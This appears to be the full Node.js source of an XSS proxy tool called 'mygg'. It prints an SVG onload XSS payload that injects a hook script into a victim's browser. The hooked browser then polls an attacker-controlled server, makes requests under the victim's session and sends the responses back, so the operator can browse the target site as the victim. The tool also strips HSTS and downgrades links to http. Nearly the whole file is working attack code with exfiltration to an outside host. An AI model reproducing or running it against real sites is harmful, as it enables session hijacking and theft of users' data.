const https = require('https');
const http = require('http');
const fs = require('fs');

/* Config */

const config = {
    // Change web_domain to your domain
    web_domain: 'example.com',           
    web_ip: '0.0.0.0',
    web_port: 443,
    // Interval in ms for each poll
    polling_time: 2000,
    key: fs.readFileSync('server.key'),
    cert: fs.readFileSync('server.crt'),
    // Either set proxy_ip to 127.0.0.1 and use ssh+portforwarding 
    // or bind it to 0.0.0.0 and put your remote addr in proxy_allowed_ips
    proxy_ip: '127.0.0.1',
    proxy_port: 8081,
    proxy_allowed_ips: ['127.0.0.1'],
}

/* 
task_pending structure:
[{"id":2,"method":"POST","url":"/secret.html","head":{"Content-Type":"application/json"},"body":'{"test":"asdf"}'}]
*/

var tasks_pending = [];
var task_callbacks = {};

/* The HTTP proxy server that communicates with mygg */

var task_counter = 10;

http.createServer(function (req, res) {
    /* Checks if the client is allowed */
    //console.log("Connection from " + req.connection.remoteAddress)
    var client_ipaddr = req.connection.remoteAddress;
    if (config.proxy_allowed_ips.indexOf(client_ipaddr) === -1) {
        console.log(`[+] Denied client ${client_ipaddr} to connect to proxy`);
        res.writeHead(403);
        res.end();
        return;
    }

    console.log(`[+] Whitelisted client ${client_ipaddr} connected to proxy`);

    /* Get the requested resouces after domain name */
    var path = new URL(req.url).pathname;
    console.log("[+] Requesting : " + path)

    /* Add new task */
    var id = task_counter;
    var new_task = {"id": task_counter++, "method": req.method, "url": path, "head": req.headers, "body": req.body}
	
    tasks_pending.push(new_task);

    task_callbacks[new_task.id] = function (result) {
        var headers_decoded = Buffer.from(result.headers, 'base64');
        var body_decoded = Buffer.from(result.body, 'base64');
        //console.log("Headers:\n" + headers_decoded);
        //console.log("Body:\n" + body_decoded);
        res.writeHead(200, stripHSTS(headers_decoded));
        res.end(https2http(body_decoded));
    };
}).listen(config.proxy_port, config.proxy_ip, function (err) {
    if (err) return console.error(err)
    var info = this.address()
    console.log(`[+] Proxy server is listening on address ${info.address} port ${info.port}`)
});


/* 
The web server communicating with the hooked browser.
Used for serving hook.js, polling and receving requests.
*/

const https_options = {
    key: config.key,
    cert: config.cert
};
https.createServer(https_options, function (req, res) {
    /* Serves the hook file */
    if (req.url == '/hook.js') {
        res.writeHead(200, {"Content-Type": "application/javascript"});
        res.end(hook_file);
        var hooked_ipaddr = req.connection.remoteAddress;
        var hooked_useragent = req.headers['user-agent']; 
        console.log("[+] Hooked new browser [" + hooked_ipaddr + "] [" + hooked_useragent + "]");
    /* Hooked browser asks mygg if there are any new jobs for it */
    } else if (req.url == '/polling') {
        //console.log(tasks_pending);
        res.setHeader('Access-Control-Allow-Origin', '*')
        res.setHeader('Access-Control-Allow-Headers', '*')
        res.setHeader('Content-Type', 'application/json')
        if (tasks_pending.length > 0) {
            data = JSON.stringify(tasks_pending);
            res.writeHead(200);
            res.end(data);
            tasks_pending = []
        } else {
            res.writeHead(404)
            res.end();
        }
    /* Catching the pre-flight request from the hooked browser */
    } else if (req.url == '/responses' && req.method == 'OPTIONS') {
        res.setHeader('Access-Control-Allow-Origin', '*')
        res.setHeader('Access-Control-Allow-Headers', 'Content-Type')
        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        res.writeHead(200);
        res.end();
    /* Catching the responses */
    } else if (req.url == '/responses' && req.method == 'POST') {
        res.setHeader('Access-Control-Allow-Origin', '*')
        res.setHeader('Access-Control-Allow-Headers', 'Content-Type')
        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        res.setHeader('Content-Type', 'application/json')

        var body = ''
        req.on('data', function (chunk) {
            body += chunk;
        });
        req.on('end', function () {
			var result = JSON.parse(body);
			var handler = task_callbacks[result.id];
			handler(result);
            res.writeHead(200);
            res.end();
        });

    } else {
        res.writeHead(404);
        res.end();
    }
}).listen(config.web_port, config.web_ip, function (err) {
    if (err) return console.error(err)
    var info = this.address()
    console.log(`[+] Web server is listening on address ${info.address} port ${info.port}`)
});


/* Removes HSTS header */
function stripHSTS(headers) {
    delete headers['Strict-Transport-Security']
    return headers;
}

/* Convert links in the body from https to http */
function https2http(body) {
    return body.toString().replace(/https\:\/\//g, "http://");
}

/* The payload that downloads mygg */
var hook = '<svg/onload="x=document.createElement(\'script\');'
var hook = hook + 'x.src="//' + config.web_domain + '/hook.js";document.head.appendChild(x);">'
console.log("[+] Payload:\r\n" + hook + "\r\n")

var hook_file = `
function makeRequest(id, method, url, head, body) {
    var target_http = new XMLHttpRequest();
    target_http.onreadystatechange = function() {
        if (target_http.readyState == 4 && target_http.status == 200) {
            var resp_status = target_http.status;
            var resp_body = btoa(target_http.responseText);
            var resp_headers = btoa(target_http.getAllResponseHeaders());
            var mygg_http = new XMLHttpRequest();
            mygg_http.open("POST", "https://${config.web_domain}/responses", true);
            mygg_http.setRequestHeader("Content-Type","application/json");
            var obj = {"id": id.toString(), "url": url, "status": resp_status, "headers": resp_headers, "body": resp_body}
            mygg_http.send(JSON.stringify(obj));
        }
    };
    target_http.open(method, url, true);
    for (var key in head) {
        target_http.setRequestHeader(key, head[key]) 
    }
    if (body != null) {
        target_http.send(body);
    } else {
        target_http.send();
    }
}
function poll() {
    var mygg_http = new XMLHttpRequest();
    mygg_http.onreadystatechange = function () {
        if (mygg_http.readyState == 4 && mygg_http.status == 200) {
            console.log(mygg_http.responseText)
            var tasks = JSON.parse(mygg_http.responseText);
            for (var i in tasks){
                makeRequest(tasks[i].id, tasks[i].method, tasks[i].url, tasks[i].head, tasks[i].body);
            }
        }
    };
    mygg_http.open("GET", "https://${config.web_domain}/polling", true);
    mygg_http.send();
    setTimeout(poll, ${config.polling_time});
}
poll();
`;
